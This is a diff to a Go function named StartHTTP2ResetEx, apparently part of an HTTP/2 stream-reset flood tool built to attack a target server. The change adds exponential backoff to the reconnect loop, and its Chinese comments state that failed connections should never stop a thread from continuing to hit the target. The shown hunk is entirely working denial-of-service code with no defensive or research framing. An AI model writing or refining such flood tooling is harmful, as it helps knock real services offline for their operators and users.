@@ -172,30 +172,37 @@ func StartHTTP2ResetEx(cfg AttackConfig) *AttackSession {
 
 				var slotWG sync.WaitGroup
 				for slot := 0; slot < resetConnsPerThread; slot++ {
-					slotWG.Add(1)
-					go func() {
-						defer slotWG.Done()
-						tc := newTimeCache()
-						var conn net.Conn
-						var rc *h2ResetConn
+						slotWG.Add(1)
+						go func() {
+							defer slotWG.Done()
+							tc := newTimeCache()
+							var conn net.Conn
+							var rc *h2ResetConn
+							backoff := 100 * time.Millisecond
+							const maxBackoff = 5 * time.Second
 
-						// 拨号/重连：失败退避重试，绝不退出（一条连接挂掉
-						// 不影响本线程继续打）
-						ensureConn := func() bool {
-							if rc != nil {
+							// 拨号/重连：指数退避重试，避免目标不可达时浪费 CPU
+							ensureConn := func() bool {
+								if rc != nil {
+									return true
+								}
+								c, framer, err := dialH2(addr, useTLS, 5*time.Second)
+								if err != nil {
+									atomic.AddUint64(&s.Stats.Errors, 1)
+									time.Sleep(backoff)
+									backoff *= 2
+									if backoff > maxBackoff {
+										backoff = maxBackoff
+									}
+									return false
+								}
+								// 连接成功，重置退避时间
+								backoff = 100 * time.Millisecond
+								conn = c
+								rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
+								rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
 								return true
 							}
-							c, framer, err := dialH2(addr, useTLS, 5*time.Second)
-							if err != nil {
-								atomic.AddUint64(&s.Stats.Errors, 1)
-								time.Sleep(100 * time.Millisecond)
-								return false
-							}
-							conn = c
-							rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
-							rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
-							return true
-						}
 
 						for tc.since(endTime) < 0 {
 							select {
